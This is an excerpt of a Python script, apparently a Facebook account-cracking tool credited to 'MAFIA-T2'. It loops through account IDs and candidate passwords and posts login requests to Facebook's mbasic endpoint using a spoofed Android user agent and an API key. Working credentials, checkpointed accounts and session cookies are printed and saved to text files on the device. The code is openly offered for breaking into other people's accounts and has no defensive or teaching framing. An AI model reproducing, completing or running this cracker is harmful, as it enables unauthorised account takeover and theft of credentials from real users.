...
\u001b[0;1m
Coded by Abdul YOUCEF HAFAFNI -XD Ansari
Modified by MAFIA-T2
""")
...
--------URL and Host--------
mbasic : https://mbasic.facebook.com/auth/login/
B-mbasic : https://b-mbasic.facebook.com/auth/login
"""
...
def method():
    ...
    if lp.isnumeric():
       ...
       main_menu()
    clear() 
    print('\033[1;97m[+] Total Accounts For CraCk : \033[1;96m '+str(len(idx)))
    ...
    def start(user):
     try:
        ...
        sys.stdout.write(f'\r {R}[{W}MAFIA-XD{R}] {R}({W}{loop}{W} / {len(idx)}{R}) {W}• {W}{len(oku)}\r')
        sys.stdout.flush()
        loop+=1
        for pswd in pp:
              heads='Dalvik/2.1.0 (Linux; U; Android 7; P30 Build/N15EJW) [FBAN/MobileAdsManagerAndroid;FBAV/120.0.0.42.50;FBBV/143436781;FBRV/0;FBPN/com.facebook.adsmanager;FBLC/it_IT;FBMF/Huawei;FBBD/Huawei;FBDV/P30;FBSV/7;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1' #Put Your user Agent Here
    ...
    "X-FB-Request-Analytics-Tags": "mbasicservice",
    ...
    "api_key": "882a8490361da98702bf97a021ddc14d",
              ...
              response = r.post('https://mbasic.facebook.com/auth/login',data=data,headers=header,allow_redirects=False).text
              if "session_key" in response:
                 ...
                 print('\033[1;96m[OK] \033[1;32m'+acc+' \033[1;96m|\033[1;32m '+pswd)
                 print(" [Cookie] ",cookie)
                 open('/sdcard/MAFIA-T2-Ok.txt','a').write(f'{acc}|{pswd}\n')
                 break
              elif "User must verify their account" in response:
                cpu.append(acc)
                print('\033[1;31m[CP] \033[1;96m'+acc+' \033[1;31m|\033[1;32m '+pswd)
                open('/sdcard/MAFIA-T2-CP.txt','a').write(f'{acc}|{pswd}\n')
                break
              else:
                   continue   
